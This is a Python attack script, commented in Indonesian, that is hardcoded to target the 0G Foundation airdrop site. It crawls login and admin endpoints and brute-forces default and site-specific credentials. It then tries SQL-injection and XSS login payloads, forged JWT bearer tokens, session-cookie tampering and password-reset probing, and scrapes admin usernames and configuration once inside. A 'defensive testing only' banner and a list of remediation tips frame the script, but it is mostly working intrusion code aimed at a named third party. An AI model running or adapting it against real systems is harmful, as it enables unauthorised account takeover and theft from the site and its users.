#!/usr/bin/env python3
"""
Direct Login Exploiter untuk 0G Foundation Airdrop
Mencoba login langsung ke sistem dengan berbagai teknik
HANYA UNTUK TUJUAN PENGETESAN KEAMANAN DEFENSIF
"""

import asyncio
import json
import re
import time
import base64
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
import requests

class DirectLoginExploiter:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.valid_credentials = []
        self.session_info = {}
        self.access_tokens = []
        self.admin_access = False
        self.discovered_forms = []
        self.successful_logins = []

    async def execute_exploitation(self):
        """Eksekusi exploitasi login langsung"""
        print("ðŸ”“ Direct Login Exploiter")
        print("=" * 60)
        print(f"ðŸŽ¯ Target: {self.target_url}")
        print("=" * 60)
        print("âš ï¸  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        try:
            # Fase 1: Discovery dan Form Analysis
            await self.discovery_phase()

            # Fase 2: Direct Login Attempts
            await self.direct_login_phase()

            # Fase 3: Advanced Bypass Techniques
            await self.advanced_bypass_phase()

            # Fase 4: Session Exploitation
            await self.session_exploitation_phase()

            # Fase 5: Admin Access
            await self.admin_access_phase()

            # Generate report
            await self.generate_exploitation_report()

            if self.successful_logins:
                print("âœ… Login exploitation successful!")
                print(f"ðŸ“Š Successful logins: {len(self.successful_logins)}")
                for login in self.successful_logins:
                    print(f"ðŸ”‘ {login['endpoint']}: {login.get('username', 'N/A')}:{login.get('password', 'N/A')}")
            else:
                print("âŒ Login exploitation failed")

        except Exception as e:
            print(f"âŒ Error during exploitation: {str(e)}")

    async def discovery_phase(self):
        """Fase 1: Discovery dan Form Analysis"""
        print("\nðŸ•µï¸ Phase 1: Discovery and Form Analysis")
        print("-" * 50)

        # Endpoint yang akan diuji
        login_endpoints = [
            "/login", "/admin", "/dashboard", "/api/login", "/auth/login",
            "/signin", "/sign-in", "/authenticate", "/verify", "/oauth",
            "/auth", "/user", "/profile", "/account", "/settings",
            "/api/auth", "/api/user", "/api/session", "/api/token",
            "/wp-admin", "/phpmyadmin", "/admin/login", "/cpanel",
            "/secure", "/member", "/client", "/vendor", "/partner"
        ]

        for endpoint in login_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self.session.get(url, timeout=15)

                if response.status_code == 200:
                    forms = self.extract_forms(response.text)
                    if forms:
                        self.discovered_forms.append({
                            "endpoint": endpoint,
                            "status_code": response.status_code,
                            "forms": forms,
                            "content": response.text
                        })
                        print(f"âœ… Found forms in: {endpoint} ({len(forms)} forms)")

                        # Analyze each form
                        for i, form in enumerate(forms):
                            await self.analyze_form(endpoint, form, i)

            except Exception as e:
                print(f"âŒ Error testing {endpoint}: {str(e)}")
                continue

        print(f"\nðŸ“Š Discovered forms: {len(self.discovered_forms)}")

    async def analyze_form(self, endpoint: str, form: Dict, form_index: int):
        """Analisis form untuk menemukan kerentanan"""
        form_type = self.detect_form_type(form)

        # Cari fields yang menarik
        username_fields = []
        password_fields = []
        token_fields = []
        hidden_fields = []

        for input_field in form.get("inputs", []):
            field_name = input_field.get("name", "").lower()
            field_type = input_field.get("type", "").lower()

            if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                username_fields.append(input_field)
            elif "pass" in field_name:
                password_fields.append(input_field)
            elif any(keyword in field_name for keyword in ["token", "auth", "sess", "csrf"]):
                token_fields.append(input_field)
            elif field_type == "hidden":
                hidden_fields.append(input_field)

        # Simpan informasi form
        form_info = {
            "endpoint": endpoint,
            "form_index": form_index,
            "form_type": form_type,
            "method": form.get("method", "GET"),
            "action": form.get("action"),
            "username_fields": username_fields,
            "password_fields": password_fields,
            "token_fields": token_fields,
            "hidden_fields": hidden_fields,
            "has_csrf": len(token_fields) > 0
        }

        # Test dasar pada form
        await self.test_form_vulnerabilities(form_info)

    def detect_form_type(self, form: Dict) -> str:
        """Deteksi tipe form"""
        action = form.get("action", "").lower()
        inputs = form.get("inputs", [])

        if any("login" in input_field.get("name", "").lower() for input_field in inputs):
            return "login"
        elif any("auth" in input_field.get("name", "").lower() for input_field in inputs):
            return "auth"
        elif "admin" in action:
            return "admin"
        elif "api" in action:
            return "api"
        else:
            return "generic"

    async def test_form_vulnerabilities(self, form_info: Dict):
        """Test kerentanan pada form"""
        # Cari pola SQL injection dalam form
        content = form_info.get("content", "")

        sql_patterns = [
            r"SELECT.*FROM.*users",
            r"SELECT.*FROM.*auth",
            r"WHERE.*username.*=",
            r"WHERE.*password.*=",
            r"mysql_.*\(",
            r"pg_query\(",
            r"sqlite3_"
        ]

        for pattern in sql_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                print(f"ðŸš¨ SQL injection pattern in {form_info['endpoint']} form {form_info['form_index']}")
                break

    def extract_forms(self, content: str) -> List[Dict]:
        """Extract forms dari HTML content"""
        forms = []

        # Pattern untuk form
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)

        for form_html in form_matches:
            form_data = {
                "action": self.extract_attribute(form_html, "action"),
                "method": self.extract_attribute(form_html, "method", "GET"),
                "inputs": self.extract_inputs(form_html)
            }
            forms.append(form_data)

        return forms

    def extract_attribute(self, html: str, attr: str, default: str = "") -> str:
        """Extract attribute dari HTML"""
        pattern = f'{attr}=[\'"]([^\'"]*)[\'"]'
        match = re.search(pattern, html, re.IGNORECASE)
        return match.group(1) if match else default

    def extract_inputs(self, form_html: str) -> List[Dict]:
        """Extract input fields dari form"""
        inputs = []

        # Pattern untuk input
        input_pattern = r'<input[^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)

        for input_html in input_matches:
            input_data = {
                "name": self.extract_attribute(input_html, "name"),
                "type": self.extract_attribute(input_html, "type", "text"),
                "value": self.extract_attribute(input_html, "value", ""),
                "required": self.extract_attribute(input_html, "required") != ""
            }
            if input_data["name"]:
                inputs.append(input_data)

        return inputs

    async def direct_login_phase(self):
        """Fase 2: Direct Login Attempts"""
        print("\nðŸ”“ Phase 2: Direct Login Attempts")
        print("-" * 50)

        # Daftar kombinasi username/password yang umum
        credentials = [
            # Username biasa
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("admin", "password123"),
            ("admin", "12345678"),
            ("admin", "123456789"),
            ("admin", "qwerty"),
            ("admin", "letmein"),

            # Administrator
            ("administrator", "administrator"),
            ("administrator", "admin"),
            ("administrator", "password"),
            ("administrator", "123456"),
            ("administrator", "admin123"),

            # Root
            ("root", "root"),
            ("root", "password"),
            ("root", "admin"),
            ("root", "123456"),

            # User
            ("user", "user"),
            ("user", "password"),
            ("user", "123456"),
            ("user", "admin"),

            # Test
            ("test", "test"),
            ("test", "password"),
            ("test", "123456"),
            ("test", "admin"),

            # Demo
            ("demo", "demo"),
            ("demo", "password"),
            ("demo", "123456"),
            ("demo", "admin"),

            # Guest
            ("guest", "guest"),
            ("guest", "password"),
            ("guest", "123456"),
            ("guest", "admin"),

            # Info
            ("info", "info"),
            ("info", "password"),
            ("info", "123456"),
            ("info", "admin"),

            # Support
            ("support", "support"),
            ("support", "password"),
            ("support", "123456"),
            ("support", "admin"),

            # Webmaster
            ("webmaster", "webmaster"),
            ("webmaster", "password"),
            ("webmaster", "123456"),
            ("webmaster", "admin"),

            # Email-based
            ("admin@0gfoundation.ai", "admin"),
            ("admin@0gfoundation.ai", "password"),
            ("admin@0gfoundation.ai", "123456"),
            ("admin@0gfoundation.ai", "admin123"),

            ("admin@airdrop.0gfoundation.ai", "admin"),
            ("admin@airdrop.0gfoundation.ai", "password"),
            ("admin@airdrop.0gfoundation.ai", "123456"),

            # Wallet addresses (umum di crypto)
            ("0x1234567890123456789012345678901234567890", "admin"),
            ("0x1234567890123456789012345678901234567890", "password"),
            ("0x1234567890123456789012345678901234567890", "123456"),

            # Ethereum addresses
            ("0x742d35Cc6634C0532925a3b8D6B5C5D2b", "admin"),
            ("0x742d35Cc6634C0532925a3b8D6B5C5D2b", "password"),

            # 0G Foundation specific
            ("0g", "0g"),
            ("0g", "password"),
            ("0g", "admin"),
            ("0g", "123456"),

            ("foundation", "foundation"),
            ("foundation", "password"),
            ("foundation", "admin"),
            ("foundation", "123456"),

            ("airdrop", "airdrop"),
            ("airdrop", "password"),
            ("airdrop", "admin"),
            ("airdrop", "123456"),

            ("crypto", "crypto"),
            ("crypto", "password"),
            ("crypto", "admin"),
            ("crypto", "123456"),

            ("blockchain", "blockchain"),
            ("blockchain", "password"),
            ("blockchain", "admin"),
            ("blockchain", "123456"),

            ("bitcoin", "bitcoin"),
            ("bitcoin", "password"),
            ("bitcoin", "admin"),
            ("bitcoin", "123456"),

            ("ethereum", "ethereum"),
            ("ethereum", "password"),
            ("ethereum", "admin"),
            ("ethereum", "123456"),

            ("wallet", "wallet"),
            ("wallet", "password"),
            ("wallet", "admin"),
            ("wallet", "123456"),

            ("web3", "web3"),
            ("web3", "password"),
            ("web3", "admin"),
            ("web3", "123456"),

            ("defi", "defi"),
            ("defi", "password"),
            ("defi", "admin"),
            ("defi", "123456"),
        ]

        # Test credentials pada setiap form
        for form_data in self.discovered_forms:
            endpoint = form_data["endpoint"]
            forms = form_data["forms"]

            for form_index, form in enumerate(forms):
                print(f"ðŸ”“ Testing form: {endpoint} [{form_index + 1}/{len(forms)}]")

                # Test dasar tanpa modifikasi
                await self.test_basic_login(endpoint, form, credentials[:20])  # Limit untuk menghindari rate limiting

                # Test dengan SQL injection
                await self.test_sql_login(endpoint, form)

                # Test dengan XSS
                await self.test_xss_login(endpoint, form)

    async def test_basic_login(self, endpoint: str, form: Dict, credentials: List[Tuple]):
        """Test login dengan credentials dasar"""
        username_field = None
        password_field = None
        csrf_field = None
        other_fields = {}

        # Identifikasi field
        for input_field in form.get("inputs", []):
            field_name = input_field.get("name", "").lower()
            field_type = input_field.get("type", "").lower()

            if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                username_field = input_field.get("name")
            elif "pass" in field_name:
                password_field = input_field.get("name")
            elif any(keyword in field_name for keyword in ["token", "auth", "sess", "csrf"]):
                csrf_field = input_field.get("name")
            elif field_type == "hidden":
                other_fields[input_field.get("name")] = input_field.get("value", "")

        if not username_field or not password_field:
            return

        # Test credentials
        for username, password in credentials:
            try:
                # Prepare form data
                form_data = other_fields.copy()
                form_data[username_field] = username
                form_data[password_field] = password

                # Handle CSRF jika ada
                if csrf_field and csrf_field in other_fields:
                    form_data[csrf_field] = other_fields[csrf_field]

                # Build URL
                action = form.get("action", endpoint)
                if action.startswith("/"):
                    url = urljoin(self.target_url, action)
                else:
                    url = action or urljoin(self.target_url, endpoint)

                # Make request
                if form.get("method", "GET").upper() == "POST":
                    response = self.session.post(url, data=form_data, timeout=15)
                else:
                    response = self.session.get(url, params=form_data, timeout=15)

                # Check for successful login
                if await self.check_successful_login(response, username, password):
                    self.successful_logins.append({
                        "endpoint": endpoint,
                        "username": username,
                        "password": password,
                        "method": form.get("method", "GET"),
                        "status_code": response.status_code,
                        "timestamp": datetime.now().isoformat()
                    })
                    self.valid_credentials.append((username, password))
                    print(f"ðŸš¨ LOGIN SUCCESS: {username}:{password} at {endpoint}")

                    # Stop jika sudah menemukan beberapa credentials
                    if len(self.successful_logins) >= 5:
                        return

            except Exception as e:
                # Ignore errors and continue
                continue

    async def test_sql_login(self, endpoint: str, form: Dict):
        """Test login dengan SQL injection"""
        username_field = None
        password_field = None
        other_fields = {}

        # Identifikasi field
        for input_field in form.get("inputs", []):
            field_name = input_field.get("name", "").lower()

            if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                username_field = input_field.get("name")
            elif "pass" in field_name:
                password_field = input_field.get("name")
            elif input_field.get("type") == "hidden":
                other_fields[input_field.get("name")] = input_field.get("value", "")

        if not username_field or not password_field:
            return

        # SQL injection payloads
        sql_payloads = [
            ("admin' --", "password"),
            ("admin' #", "password"),
            ("admin' OR '1'='1' --", "password"),
            ("admin' OR '1'='1' #", "password"),
            ("' OR '1'='1' --", "password"),
            ("' OR '1'='1' #", "password"),
            ("admin' OR 1=1 --", "password"),
            ("admin' OR 1=1 #", "password"),
            ("' OR 1=1 --", "password"),
            ("' OR 1=1 #", "password"),
            ("admin'; --", "password"),
            ("admin'; #", "password"),
            ("'; --", "password"),
            ("'; #", "password"),
        ]

        # Test SQL injection
        for sql_username, sql_password in sql_payloads:
            try:
                form_data = other_fields.copy()
                form_data[username_field] = sql_username
                form_data[password_field] = sql_password

                # Build URL
                action = form.get("action", endpoint)
                if action.startswith("/"):
                    url = urljoin(self.target_url, action)
                else:
                    url = action or urljoin(self.target_url, endpoint)

                # Make request
                if form.get("method", "GET").upper() == "POST":
                    response = self.session.post(url, data=form_data, timeout=15)
                else:
                    response = self.session.get(url, params=form_data, timeout=15)

                # Check for successful login
                if await self.check_successful_login(response, sql_username, sql_password):
                    self.successful_logins.append({
                        "endpoint": endpoint,
                        "username": sql_username,
                        "password": sql_password,
                        "method": form.get("method", "GET"),
                        "status_code": response.status_code,
                        "attack_type": "sql_injection",
                        "timestamp": datetime.now().isoformat()
                    })
                    print(f"ðŸš¨ SQL INJECTION LOGIN: {sql_username}:{sql_password} at {endpoint}")

            except Exception:
                continue

    async def test_xss_login(self, endpoint: str, form: Dict):
        """Test login dengan XSS"""
        username_field = None
        password_field = None
        other_fields = {}

        # Identifikasi field
        for input_field in form.get("inputs", []):
            field_name = input_field.get("name", "").lower()

            if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                username_field = input_field.get("name")
            elif "pass" in field_name:
                password_field = input_field.get("name")
            elif input_field.get("type") == "hidden":
                other_fields[input_field.get("name")] = input_field.get("value", "")

        if not username_field or not password_field:
            return

        # XSS payloads
        xss_payloads = [
            ("<script>alert('XSS')</script>", "password"),
            ("'><script>alert('XSS')</script>", "password"),
            ('"\'><script>alert("XSS")</script>', "password"),
            ("javascript:alert('XSS')", "password"),
            ("<img src=x onerror=alert('XSS')>", "password"),
            ("<svg onload=alert('XSS')>", "password"),
            ("<iframe src=javascript:alert('XSS')>", "password"),
        ]

        # Test XSS
        for xss_username, xss_password in xss_payloads:
            try:
                form_data = other_fields.copy()
                form_data[username_field] = xss_username
                form_data[password_field] = xss_password

                # Build URL
                action = form.get("action", endpoint)
                if action.startswith("/"):
                    url = urljoin(self.target_url, action)
                else:
                    url = action or urljoin(self.target_url, endpoint)

                # Make request
                if form.get("method", "GET").upper() == "POST":
                    response = self.session.post(url, data=form_data, timeout=15)
                else:
                    response = self.session.get(url, params=form_data, timeout=15)

                # Check for successful login
                if await self.check_successful_login(response, xss_username, xss_password):
                    self.successful_logins.append({
                        "endpoint": endpoint,
                        "username": xss_username,
                        "password": xss_password,
                        "method": form.get("method", "GET"),
                        "status_code": response.status_code,
                        "attack_type": "xss",
                        "timestamp": datetime.now().isoformat()
                    })
                    print(f"ðŸš¨ XSS LOGIN: {xss_username}:{xss_password} at {endpoint}")

            except Exception:
                continue

    async def check_successful_login(self, response, username: str, password: str) -> bool:
        """Check apakah login berhasil"""
        # Status code indicators
        if response.status_code not in [200, 302, 303, 307, 308]:
            return False

        content = response.text.lower()

        # Login success indicators
        success_indicators = [
            'welcome', 'dashboard', 'profile', 'account', 'settings',
            'admin panel', 'administrator', 'logged in', 'authenticated',
            'success', 'welcome back', 'my account', 'user profile',
            'dashboard', 'control panel', 'management', 'console'
        ]

        # Login failure indicators
        failure_indicators = [
            'invalid', 'incorrect', 'wrong', 'error', 'failed',
            'unauthorized', 'access denied', 'not authorized',
            'invalid credentials', 'authentication failed',
            'login failed', 'sign in failed', 'access denied'
        ]

        # Check for success
        has_success = any(indicator in content for indicator in success_indicators)
        has_failure = any(indicator in content for indicator in failure_indicators)

        # Special check for redirects (might indicate successful login)
        if response.status_code in [302, 303, 307, 308]:
            location = response.headers.get('location', '')
            if any(keyword in location.lower() for keyword in ['dashboard', 'admin', 'profile', 'account']):
                has_success = True

        # Consider successful if no failure indicators and has success indicators
        # or if redirected to a protected page
        return has_success and not has_failure or response.status_code in [302, 303, 307, 308]

    async def advanced_bypass_phase(self):
        """Fase 3: Advanced Bypass Techniques"""
        print("\nðŸ”“ Phase 3: Advanced Bypass Techniques")
        print("-" * 50)

        # JWT Token Bypass
        await self.jwt_bypass()

        # Session Hijacking
        await self.session_hijacking()

        # Password Reset Bypass
        await self.password_reset_bypass()

    async def jwt_bypass(self):
        """JWT Token Bypass"""
        print("\nðŸŽ­ JWT Token Bypass")

        # Common JWT tokens
        jwt_tokens = [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.abc123",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30",  # Empty payload
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.Z4a5b6C7d8e9f0g1h2i3j4k5l6m7n8o9p0q1r2s3t4",  # Modified token
        ]

        # Test tokens pada endpoint yang memerlukan autentikasi
        protected_endpoints = ["/admin", "/dashboard", "/settings", "/profile"]

        for token in jwt_tokens:
            for endpoint in protected_endpoints:
                try:
                    headers = {
                        "Authorization": f"Bearer {token}",
                        "Content-Type": "application/json"
                    }

                    response = self.session.get(
                        urljoin(self.target_url, endpoint),
                        headers=headers,
                        timeout=15
                    )

                    if response.status_code == 200:
                        content = response.text.lower()
                        if any(indicator in content for indicator in ['admin', 'dashboard', 'settings', 'profile']):
                            print(f"ðŸš¨ JWT BYPASS: Token {token[:20]}... works on {endpoint}")
                            self.admin_access = True
                            return

                except Exception:
                    continue

    async def session_hijacking(self):
        """Session Hijacking"""
        print("\nðŸ”„ Session Hijacking")

        # Dapatkan session cookies
        initial_response = self.session.get(self.target_url)
        cookies = initial_response.cookies

        if cookies:
            print(f"ðŸ“‹ Found {len(cookies)} cookies")

            # Try session fixation
            for cookie in cookies:
                cookie_name = cookie.name
                original_value = cookie.value

                # Try common session values
                session_values = [
                    "admin", "administrator", "root", "1", "test",
                    "admin' --", "admin' #", "' OR '1'='1",
                    "1' OR '1'='1", "1' OR 1=1--", "admin' OR '1'='1'--"
                ]

                for session_value in session_values:
                    try:
                        # Set custom cookie
                        self.session.cookies.set(cookie_name, session_value)

                        # Try to access protected pages
                        for endpoint in ["/admin", "/dashboard"]:
                            response = self.session.get(
                                urljoin(self.target_url, endpoint),
                                timeout=15
                            )

                            if response.status_code == 200:
                                content = response.text.lower()
                                if any(indicator in content for indicator in ['admin', 'dashboard', 'settings']):
                                    print(f"ðŸš¨ SESSION HIJACK: {cookie_name}={session_value} works on {endpoint}")
                                    self.admin_access = True
                                    return

                    except Exception:
                        continue

        # Reset cookies
        self.session.cookies.clear()

    async def password_reset_bypass(self):
        """Password Reset Bypass"""
        print("\nðŸ”„ Password Reset Bypass")

        # Common password reset endpoints
        reset_endpoints = [
            "/reset-password", "/forgot-password", "/password-reset",
            "/forgot", "/recovery", "/account/recovery"
        ]

        # Test password reset functionality
        for endpoint in reset_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self.session.get(url, timeout=15)

                if response.status_code == 200:
                    # Check for reset form
                    forms = self.extract_forms(response.text)
                    for form in forms:
                        await self.test_reset_bypass(endpoint, form)

            except Exception:
                continue

    async def test_reset_bypass(self, endpoint: str, form: Dict):
        """Test password reset bypass"""
        # Look for email/user field
        email_field = None
        submit_button = None

        for input_field in form.get("inputs", []):
            field_name = input_field.get("name", "").lower()

            if any(keyword in field_name for keyword in ["email", "user", "login", "username"]):
                email_field = input_field.get("name")
            elif input_field.get("type") == "submit":
                submit_button = input_field

        if email_field:
            # Try various email addresses
            test_emails = [
                "admin@0gfoundation.ai",
                "administrator@0gfoundation.ai",
                "root@0gfoundation.ai",
                "admin",
                "administrator",
                "root",
                "' OR '1'='1' --",
                "'admin' --",
                "admin@' OR '1'='1 --"
            ]

            for email in test_emails:
                try:
                    form_data = {email_field: email}

                    # Add submit button value if exists
                    if submit_button:
                        form_data[submit_button.get("name", "")] = submit_button.get("value", "Submit")

                    # Build URL
                    action = form.get("action", endpoint)
                    if action.startswith("/"):
                        url = urljoin(self.target_url, action)
                    else:
                        url = action or urljoin(self.target_url, endpoint)

                    # Make request
                    if form.get("method", "GET").upper() == "POST":
                        response = self.session.post(url, data=form_data, timeout=15)
                    else:
                        response = self.session.get(url, params=form_data, timeout=15)

                    # Check for reset success
                    if response.status_code == 200:
                        content = response.text.lower()
                        success_indicators = ['reset', 'sent', 'email', 'link', 'instructions']
                        error_indicators = ['not found', 'invalid', 'does not exist']

                        has_success = any(indicator in content for indicator in success_indicators)
                        has_error = any(indicator in content for indicator in error_indicators)

                        if has_success and not has_error:
                            print(f"ðŸš¨ RESET BYPASS: {email} works on {endpoint}")

                except Exception:
                    continue

    async def session_exploitation_phase(self):
        """Fase 4: Session Exploitation"""
        print("\nðŸ”‘ Phase 4: Session Exploitation")
        print("-" * 50)

        # Extract session information
        await self.extract_session_info()

        # Test session persistence
        await self.test_session_persistence()

        # Test session token manipulation
        await self.test_session_tokens()

    async def extract_session_info(self):
        """Extract session information"""
        # Make request to get session info
        response = self.session.get(self.target_url, timeout=15)

        # Extract cookies
        for cookie in response.cookies:
            self.session_info[cookie.name] = {
                "value": cookie.value,
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "expires": getattr(cookie, 'expires', None)
            }

        print(f"ðŸ“Š Session info extracted: {len(self.session_info)} items")

    async def test_session_persistence(self):
        """Test session persistence across requests"""
        # Test multiple requests with same session
        endpoints = ["/", "/dashboard", "/admin", "/settings"]

        for endpoint in endpoints:
            try:
                response = self.session.get(urljoin(self.target_url, endpoint), timeout=15)

                if response.status_code == 200:
                    content = response.text.lower()
                    if any(indicator in content for indicator in ['dashboard', 'admin', 'settings']):
                        print(f"ðŸ”‘ Session persistence confirmed: {endpoint}")

            except Exception:
                continue

    async def test_session_tokens(self):
        """Test session token manipulation"""
        if not self.session_info:
            return

        # Try to manipulate session tokens
        for cookie_name, cookie_info in self.session_info.items():
            original_value = cookie_info["value"]

            # Try various token values
            token_values = [
                "admin", "administrator", "root", "1",
                "admin' --", "admin' #", "' OR '1'='1",
                "1' OR '1'='1", "1' OR 1=1--", "admin' OR '1'='1'--"
            ]

            for token_value in token_values:
                try:
                    # Set custom token
                    self.session.cookies.set(cookie_name, token_value)

                    # Try to access protected pages
                    for endpoint in ["/admin", "/dashboard"]:
                        response = self.session.get(
                            urljoin(self.target_url, endpoint),
                            timeout=15
                        )

                        if response.status_code == 200:
                            content = response.text.lower()
                            if any(indicator in content for indicator in ['admin', 'dashboard', 'settings']):
                                print(f"ðŸš¨ TOKEN HIJACK: {cookie_name}={token_value} works on {endpoint}")
                                self.admin_access = True
                                return

                except Exception:
                    continue

            # Reset cookie
            self.session.cookies.set(cookie_name, original_value)

    async def admin_access_phase(self):
        """Fase 5: Admin Access"""
        print("\nðŸ‘¤ Phase 5: Admin Access")
        print("-" * 50)

        # Test admin access with found credentials
        await self.test_admin_credentials()

        # Test direct admin access
        await self.test_direct_admin_access()

        # Extract admin panel information
        await self.extract_admin_info()

    async def test_admin_credentials(self):
        """Test admin access with found credentials"""
        if not self.successful_logins:
            return

        for login in self.successful_logins:
            username = login.get("username", "")
            password = login.get("password", "")

            # Try to access admin panel
            admin_endpoints = [
                "/admin", "/administrator", "/admin/dashboard", "/admin panel",
                "/wp-admin", "/cpanel", "/phpmyadmin", "/admin/settings",
                "/admin/users", "/admin/config"
            ]

            for endpoint in admin_endpoints:
                try:
                    # Use existing session or make new request
                    response = self.session.get(
                        urljoin(self.target_url, endpoint),
                        timeout=15
                    )

                    if response.status_code == 200:
                        content = response.text.lower()
                        if any(indicator in content for indicator in ['admin panel', 'dashboard', 'settings']):
                            print(f"ðŸš¨ ADMIN ACCESS: {username}:{password} can access {endpoint}")
                            self.admin_access = True
                            login["admin_access"] = [endpoint]
                            return

                except Exception:
                    continue

    async def test_direct_admin_access(self):
        """Test direct admin access without credentials"""
        admin_endpoints = [
            "/admin", "/administrator", "/admin/dashboard", "/admin panel",
            "/wp-admin", "/cpanel", "/phpmyadmin", "/admin/settings",
            "/admin/users", "/admin/config"
        ]

        for endpoint in admin_endpoints:
            try:
                response = self.session.get(
                    urljoin(self.target_url, endpoint),
                    timeout=15
                )

                if response.status_code == 200:
                    content = response.text.lower()
                    if any(indicator in content for indicator in ['admin panel', 'dashboard', 'settings']):
                        print(f"ðŸš¨ DIRECT ADMIN ACCESS: {endpoint} accessible without credentials")
                        self.admin_access = True
                        return

            except Exception:
                continue

    async def extract_admin_info(self):
        """Extract admin panel information"""
        if not self.admin_access:
            return

        admin_endpoints = ["/admin", "/dashboard", "/settings"]

        for endpoint in admin_endpoints:
            try:
                response = self.session.get(
                    urljoin(self.target_url, endpoint),
                    timeout=15
                )

                if response.status_code == 200:
                    content = response.text

                    # Extract usernames
                    usernames = self.extract_usernames(content)
                    for username in usernames:
                        print(f"ðŸ‘¤ Extracted admin username: {username}")

                    # Extract configuration
                    config_info = self.extract_config_info(content)
                    for config_key, config_value in config_info.items():
                        print(f"âš™ï¸ Extracted config: {config_key} = {config_value}")

            except Exception:
                continue

    def extract_usernames(self, content: str) -> List[str]:
        """Extract usernames from content"""
        usernames = []

        patterns = [
            r'>([^<]+)</td>\s*</tr>\s*<tr>\s*<td[^>]*>Username',
            r'Username[^>]*>([^<]+)',
            r'Logged in as[^>]*>([^<]+)',
            r'Welcome[^>]*>([^<]+)',
            r'User[^>]*>([^<]+)',
            r'Admin[^>]*>([^<]+)'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match.strip()) > 2 and not match.strip().isdigit():
                    usernames.append(match.strip())

        return list(set(usernames))  # Remove duplicates

    def extract_config_info(self, content: str) -> Dict[str, str]:
        """Extract configuration information"""
        config_info = {}

        patterns = {
            'Database': r'Database[^>]*>([^<]+)',
            'Host': r'Host[^>]*>([^<]+)',
            'Version': r'Version[^>]*>([^<]+)',
            'Server': r'Server[^>]*>([^<]+)',
            'Environment': r'Environment[^>]*>([^<]+)',
            'System': r'System[^>]*>([^<]+)',
            'Config': r'Config[^>]*>([^<]+)',
            'Setting': r'Setting[^>]*>([^<]+)'
        }

        for config_key, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                config_info[config_key] = matches[0]

        return config_info

    async def generate_exploitation_report(self):
        """Generate comprehensive exploitation report"""
        print("\nðŸ“‹ Generating Exploitation Report")

        report = {
            "scan_info": {
                "target_url": self.target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Direct Login Exploitation",
                "scan_duration": "30-60 detik"
            },
            "summary": {
                "successful_logins": len(self.successful_logins),
                "valid_credentials": len(self.valid_credentials),
                "admin_access": self.admin_access,
                "discovered_forms": len(self.discovered_forms),
                "risk_level": "Critical" if self.admin_access else "High"
            },
            "successful_logins": self.successful_logins,
            "credentials": self.valid_credentials,
            "session_info": self.session_info,
            "discovered_forms": self.discovered_forms,
            "recommendations": [
                "Implement strong password policies",
                "Use parameterized queries to prevent SQL injection",
                "Implement proper input validation",
                "Use secure session management",
                "Implement rate limiting to prevent brute force attacks",
                "Use multi-factor authentication",
                "Implement proper error handling",
                "Use Web Application Firewall (WAF)",
                "Regular security audits and penetration testing"
            ]
        }

        # Save detailed report
        filename = f"direct_login_exploitation_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"ðŸ“Š Detailed report saved to: {filename}")

async def main():
    """Main execution function"""
    target_url = "https://airdrop.0gfoundation.ai"

    print("ðŸ”“ Direct Login Exploiter")
    print("=" * 70)
    print(f"ðŸŽ¯ Target: {target_url}")
    print("=" * 70)
    print("âš ï¸  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
    print("=" * 70)

    exploiter = DirectLoginExploiter(target_url)
    await exploiter.execute_exploitation()

if __name__ == "__main__":
    asyncio.run(main())